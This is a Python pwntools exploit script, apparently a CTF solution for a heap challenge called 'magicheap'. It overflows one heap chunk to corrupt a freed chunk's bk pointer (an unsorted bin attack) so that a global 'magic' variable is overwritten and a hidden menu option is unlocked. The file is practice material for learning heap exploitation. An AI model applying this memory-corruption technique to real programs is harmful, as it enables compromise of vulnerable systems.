#encoding:utf-8
from pwn import *
context(os="linux", arch="amd64",log_level = "debug")

ip =""
if ip:
    p = remote(ip,20004)
else:
    p = process("./magicheap")#, aslr=0

elf = ELF("./magicheap")

libc = elf.libc
#-------------------------------------
def sl(s):
    p.sendline(s)
def sd(s):
    p.send(s)
def rc(timeout=0):
    if timeout == 0:
        return p.recv()
    else:
        return p.recv(timeout=timeout)
def ru(s, timeout=0):
    if timeout == 0:
        return p.recvuntil(s)
    else:
        return p.recvuntil(s, timeout=timeout)
def debug(msg=''):
    gdb.attach(p,'')
    pause()
def getshell():
    p.interactive()
#-------------------------------------

def create(Size,contant):
    ru("Your choice :")
    sl("1")
    ru("Size of Heap : ")
    sl(str(Size))
    ru("Content of heap:")
    sd(contant) 

def edit(index,Size,contant):
    ru("Your choice :")
    sl("2")
    ru("Index :")
    sl(str(index))
    ru("Size of Heap : ")
    sl(str(Size))
    ru("Content of heap : ")
    sd(contant)

def delete(index):
    ru("Your choice :")
    sl("3")
    ru("Index :")
    sl(str(index))

create(0x20, "aaaa")  # 0
create(0x80, "aaaa")  # 1
create(0x20, "aaaa")  # 2

delete(1)

magic = 0x6020c0
fd = 0
bk = magic - 0x10

payload = "a" * 0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk)
edit(0, 0x40,payload)
create(0x80, "aaaa")

p.recvuntil(":")
p.sendline("4869")
print p.recvall()
#getshell()
